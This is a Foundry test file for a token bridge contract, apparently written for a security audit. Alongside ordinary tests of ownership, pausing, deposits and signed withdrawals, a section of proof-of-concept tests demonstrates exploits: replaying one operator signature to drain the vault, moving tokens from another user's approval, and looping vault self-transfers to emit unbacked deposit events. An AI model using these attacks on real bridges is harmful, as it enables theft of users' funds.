// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console2 } from "forge-std/Test.sol";
import { ECDSA } from "openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import { MessageHashUtils } from "openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import { Ownable } from "openzeppelin/contracts/access/Ownable.sol";
import { Pausable } from "@openzeppelin/contracts/utils/Pausable.sol";
import { L1BossBridge, L1Vault } from "../src/L1BossBridge.sol";
import { IERC20 } from "openzeppelin/contracts/interfaces/IERC20.sol";
import { L1Token } from "../src/L1Token.sol";

contract L1BossBridgeTest is Test {
    event Deposit(address from, address to, uint256 amount);

    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address userInL2 = makeAddr("userInL2");
    Account operator = makeAccount("operator");

    L1Token token;
    L1BossBridge tokenBridge;
    L1Vault vault;

    function setUp() public {
        vm.startPrank(deployer);

        // Deploy token and transfer the user some initial balance
        token = new L1Token();
        token.transfer(address(user), 1000e18);

        // Deploy bridge
        tokenBridge = new L1BossBridge(IERC20(token));
        vault = tokenBridge.vault();

        // Add a new allowed signer to the bridge
        tokenBridge.setSigner(operator.addr, true);

        vm.stopPrank();
    }

    function testDeployerOwnsBridge() public {
        address owner = tokenBridge.owner();
        assertEq(owner, deployer);
    }

    function testBridgeOwnsVault() public {
        address owner = vault.owner();
        assertEq(owner, address(tokenBridge));
    }

    function testTokenIsSetInBridgeAndVault() public {
        assertEq(address(tokenBridge.token()), address(token));
        assertEq(address(vault.token()), address(token));
    }

    function testVaultInfiniteAllowanceToBridge() public {
        assertEq(token.allowance(address(vault), address(tokenBridge)), type(uint256).max);
    }

    function testOnlyOwnerCanPauseBridge() public {
        vm.prank(tokenBridge.owner());
        tokenBridge.pause();
        assertTrue(tokenBridge.paused());
    }

    function testNonOwnerCannotPauseBridge() public {
        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, address(this)));
        tokenBridge.pause();
    }

    function testOwnerCanUnpauseBridge() public {
        vm.startPrank(tokenBridge.owner());
        tokenBridge.pause();
        assertTrue(tokenBridge.paused());

        tokenBridge.unpause();
        assertFalse(tokenBridge.paused());
        vm.stopPrank();
    }

    function testNonOwnerCannotUnpauseBridge() public {
        vm.prank(tokenBridge.owner());
        tokenBridge.pause();
        assertTrue(tokenBridge.paused());

        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, address(this)));
        tokenBridge.unpause();
    }

    function testInitialSignerWasRegistered() public {
        assertTrue(tokenBridge.signers(operator.addr));
    }

    function testNonOwnerCannotAddSigner() public {
        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, address(this)));
        tokenBridge.setSigner(operator.addr, true);
    }

    function testUserCannotDepositWhenBridgePaused() public {
        vm.prank(tokenBridge.owner());
        tokenBridge.pause();

        vm.startPrank(user);
        uint256 amount = 10e18;
        token.approve(address(tokenBridge), amount);

        vm.expectRevert(Pausable.EnforcedPause.selector);
        tokenBridge.depositTokensToL2(user, userInL2, amount);
        vm.stopPrank();
    }

    function testUserCannotDepositBeyondLimit() public {
        vm.startPrank(user);
        uint256 amount = tokenBridge.DEPOSIT_LIMIT() + 1;
        deal(address(token), user, amount);
        token.approve(address(tokenBridge), amount);

        vm.expectRevert(L1BossBridge.L1BossBridge__DepositLimitReached.selector);
        tokenBridge.depositTokensToL2(user, userInL2, amount);
        vm.stopPrank();
    }

    function testUserCanWithdrawTokensWithOperatorSignature() public {
        vm.startPrank(user);
        uint256 depositAmount = 10e18;
        uint256 userInitialBalance = token.balanceOf(address(user));

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        assertEq(token.balanceOf(address(vault)), depositAmount);
        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);

        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);

        assertEq(token.balanceOf(address(user)), userInitialBalance);
        assertEq(token.balanceOf(address(vault)), 0);
    }

    function testUserCannotWithdrawTokensWithUnknownOperatorSignature() public {
        vm.startPrank(user);
        uint256 depositAmount = 10e18;
        uint256 userInitialBalance = token.balanceOf(address(user));

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        assertEq(token.balanceOf(address(vault)), depositAmount);
        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);

        (uint8 v, bytes32 r, bytes32 s) =
            _signMessage(_getTokenWithdrawalMessage(user, depositAmount), makeAccount("unknownOperator").key);

        vm.expectRevert(L1BossBridge.L1BossBridge__Unauthorized.selector);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
    }

    function testUserCannotWithdrawTokensWithInvalidSignature() public {
        vm.startPrank(user);
        uint256 depositAmount = 10e18;

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
        uint8 v = 0;
        bytes32 r = 0;
        bytes32 s = 0;

        vm.expectRevert(ECDSA.ECDSAInvalidSignature.selector);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
    }

    function testUserCannotWithdrawTokensWhenBridgePaused() public {
        vm.startPrank(user);
        uint256 depositAmount = 10e18;

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
        vm.startPrank(tokenBridge.owner());
        tokenBridge.pause();

        vm.expectRevert(Pausable.EnforcedPause.selector);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
    }

    function _getTokenWithdrawalMessage(address recipient, uint256 amount) private view returns (bytes memory) {
        return abi.encode(
            address(token), // target
            0, // value
            abi.encodeCall(IERC20.transferFrom, (address(vault), recipient, amount)) // data
        );
    }

    /**
     * Mocks part of the off-chain mechanism where there operator approves requests for withdrawals by signing them.
     * Although not coded here (for simplicity), you can safely assume that our operator refuses to sign any withdrawal
     * request from an account that never originated a transaction containing a successful deposit.
     */
    function _signMessage(
        bytes memory message,
        uint256 privateKey
    )
        private
        pure
        returns (uint8 v, bytes32 r, bytes32 s)
    {
        return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
    }

    /*///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                                HERE BEGIN THE PROOF OF CONCEPTS 
    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////*/

    function testAttackerCanDrainAllFunds() public {
        // A whale deposits
        uint256 depositAmount = 100 ether;

        vm.startPrank(user);
        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
        vm.stopPrank();

        // Create attacker, buy some tokens and deposit it
        uint256 attackerAmount = 1 ether;
        address attacker = makeAddr("attacker");
        
        vm.prank(tokenBridge.owner());
        token.transfer(attacker, attackerAmount);

        vm.startPrank(attacker);
        token.approve(address(tokenBridge), attackerAmount);
        tokenBridge.depositTokensToL2(attacker, userInL2, attackerAmount);
        vm.stopPrank();

        // An attacker starts draining
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(attacker, attackerAmount), operator.key);
        for(uint256 i=0; i<101; i++){
            tokenBridge.withdrawTokensToL1(attacker, attackerAmount, v, r, s);
        }
        
        assertEq(token.balanceOf(attacker), depositAmount + attackerAmount);
    }

    function testUserCanDepositTokens(uint256 amount) public {
        vm.assume(amount>0 && amount <= 1000e18);
        vm.startPrank(user);
        token.approve(address(tokenBridge), amount);

        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, userInL2, amount);
        tokenBridge.depositTokensToL2(user, userInL2, amount);

        assertEq(token.balanceOf(address(tokenBridge)), 0);
        assertEq(token.balanceOf(address(vault)), amount);
        vm.stopPrank();
    }

    function testFuzzUserCanWithdrawTokensWithOperatorSignature(uint256 depositAmount) public {
        vm.assume(depositAmount>0 && depositAmount<=1000e18);
        vm.deal(user, 1 ether);
        vm.startPrank(user);
        uint256 userInitialBalance = token.balanceOf(address(user));

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        assertEq(token.balanceOf(address(vault)), depositAmount);
        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);

        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);

        assertEq(token.balanceOf(address(user)), userInitialBalance);
        assertEq(token.balanceOf(address(vault)), 0);
        vm.stopPrank();

        // These are the invariants
        assertEq(token.totalSupply(), 1_000_000e18);
        assertEq(token.totalSupply(), token.balanceOf(deployer)+1000e18);

    }

    function testFuzzUserCannotWithdrawTokensWithUnknownOperatorSignature(uint256 depositAmount, uint256 falseOperator) public {
        vm.assume(depositAmount>0 && depositAmount<=1000e18);
        vm.assume(operator.key != falseOperator && falseOperator != 0 && falseOperator<115792089237316195423570985008687907852837564279074904382605163141518161494337);

        vm.startPrank(user);
        uint256 userInitialBalance = token.balanceOf(address(user));

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        assertEq(token.balanceOf(address(vault)), depositAmount);
        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);

        (uint8 v, bytes32 r, bytes32 s) =
            _signMessage(_getTokenWithdrawalMessage(user, depositAmount), falseOperator);

        vm.expectRevert(L1BossBridge.L1BossBridge__Unauthorized.selector);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);

    }

    function testIsNotNeccessaryAttackerToDepositToDrainFunds() public {
        vm.startPrank(user);
        uint256 userInitialBalance = token.balanceOf(address(user));
        uint256 depositAmount = 100 ether;
        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        assertEq(token.balanceOf(address(vault)), depositAmount);
        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);

        uint256 attackerAmount = 1 ether;
        address attacker = makeAddr("attacker");
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(attacker, attackerAmount), operator.key);
        
        tokenBridge.withdrawTokensToL1(attacker, attackerAmount, v, r, s);

        for(uint i =0; i<99; i++ ){
            tokenBridge.withdrawTokensToL1(attacker, attackerAmount, v, r, s);
        }

        console2.log(token.balanceOf(attacker)/1e18);
    }

    function testCanMoveApproveTokensOfOtherUsers() public {
        // poor alice approving
        vm.prank(user);
        token.approve(address(tokenBridge), type(uint256).max);

        // Bob
        uint256 depositAmount = token.balanceOf(user);
        address attacker = makeAddr("attacker"); 
        vm.startPrank(attacker);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, attacker, depositAmount);
        tokenBridge.depositTokensToL2(user, attacker, depositAmount); 

        assertEq(token.balanceOf(user), 0);
        assertEq(token.balanceOf(address(vault)), depositAmount);
        vm.stopPrank();
    }

    function testCanTransferFromVaultToVault() public {
        address attacker = makeAddr("attacker");

        uint256 vaultBalance = 500 ether;
        deal(address(token), address(vault), vaultBalance);

        // Can trigger the deposi event, self transfer tokens to the vault 
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), attacker, vaultBalance);
        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance); 

        // Can do this forever
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), attacker, vaultBalance);
        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance); 
    }

}
